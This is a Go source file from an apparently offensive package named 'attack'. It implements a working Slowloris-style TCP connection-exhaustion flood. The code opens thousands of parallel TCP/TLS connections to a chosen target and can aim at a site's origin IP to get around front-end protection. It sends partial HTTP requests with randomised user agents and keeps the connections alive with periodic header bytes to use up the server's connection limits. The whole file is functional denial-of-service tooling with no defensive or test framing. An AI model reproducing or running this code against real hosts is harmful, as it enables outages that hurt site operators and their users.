package attack

import (
	"crypto/tls"
	"log"
	"net"
	"net/url"
	"sync"
	"sync/atomic"
	"time"
)

// TCP Connection Exhaustion
// Open as many TCP connections as possible, hold them open
// Targets max file descriptor limit (usually 65535 on Linux, lower on default config)

func runConnectionFlood(cfg *AttackConfig) {
	atomic.StoreInt32(&stopFlag, 0)
	startTime := time.Now()
	deadline := startTime.Add(time.Duration(cfg.Duration) * time.Second)

	target := cfg.Target
	host := target
	port := "443"
	useTLS := true

	if u, err := url.Parse(target); err == nil && u.Hostname() != "" {
		host = u.Hostname()
		if u.Port() != "" {
			port = u.Port()
		} else {
			if u.Scheme == "http" {
				port = "80"
				useTLS = false
			}
		}
	}

	if cfg.OriginIP != "" {
		host = cfg.OriginIP
	}

	maxConns := cfg.MaxConns
	if maxConns < 1000 {
		maxConns = 5000
	}

	log.Printf("Connection Exhaustion: opening %d TCP connections to %s:%s", maxConns, host, port)

	connections := make([]net.Conn, 0, maxConns)
	var connMu sync.Mutex

	semaphore := make(chan struct{}, 200) // 200 parallel dials at once

	var wg sync.WaitGroup
	for i := 0; i < maxConns; i++ {
		wg.Add(1)
		semaphore <- struct{}{}
		go func() {
			defer wg.Done()
			defer func() { <-semaphore }()
			defer func() {
				if r := recover(); r != nil {
					log.Printf("ConnFlood recovered: %v", r)
				}
			}()

			if atomic.LoadInt32(&stopFlag) == 1 {
				return
			}

			dialer := &net.Dialer{Timeout: 5 * time.Second}
			conn, err := dialer.Dial("tcp", host+":"+port)
			if err != nil {
				atomic.AddInt64(&metrics.Failed, 1)
				return
			}

			if tcpConn, ok := conn.(*net.TCPConn); ok {
				tcpConn.SetKeepAlive(true)
				tcpConn.SetKeepAlivePeriod(30 * time.Second)
				tcpConn.SetNoDelay(true)
			}

			if useTLS {
				tlsConn := tls.Client(conn, &tls.Config{
					InsecureSkipVerify: true,
					ServerName:         host,
				})
				tlsConn.SetDeadline(time.Now().Add(10 * time.Second))
				if err := tlsConn.Handshake(); err != nil {
					conn.Close()
					atomic.AddInt64(&metrics.Failed, 1)
					return
				}
				tlsConn.SetDeadline(time.Time{})
				conn = tlsConn
			}

			// Send partial HTTP request to keep connection in active state
			partial := []byte("GET / HTTP/1.1\r\nHost: " + host + "\r\nUser-Agent: " + randomUA() + "\r\n")
			conn.Write(partial)

			connMu.Lock()
			connections = append(connections, conn)
			connMu.Unlock()

			atomic.AddInt64(&metrics.Completed, 1)
			atomic.AddInt64(&metrics.TotalRequests, 1)
			atomic.AddInt64(&metrics.InFlight, 1)
		}()
	}

	wg.Wait()

	connMu.Lock()
	openCount := len(connections)
	connMu.Unlock()

	log.Printf("Held %d TCP connections, sustaining for %v", openCount, time.Until(deadline))

	// Periodically send keep-alive bytes to maintain connections
	keepAliveTicker := time.NewTicker(15 * time.Second)
	defer keepAliveTicker.Stop()

	for time.Now().Before(deadline) {
		if atomic.LoadInt32(&stopFlag) == 1 {
			break
		}

		select {
		case <-keepAliveTicker.C:
			connMu.Lock()
			alive := connections[:0]
			for _, conn := range connections {
				_, err := conn.Write([]byte("X-Keep-Alive: " + randomUA() + "\r\n"))
				if err == nil {
					alive = append(alive, conn)
				} else {
					conn.Close()
					atomic.AddInt64(&metrics.InFlight, -1)
				}
			}
			connections = alive
			connMu.Unlock()
			log.Printf("Keep-alive cycle: %d connections still active", len(connections))
		case <-time.After(1 * time.Second):
		}
	}

	connMu.Lock()
	for _, conn := range connections {
		conn.Close()
	}
	connections = nil
	connMu.Unlock()

	metricsMu.Lock()
	metrics.Elapsed = time.Since(startTime).Seconds()
	metricsMu.Unlock()
}

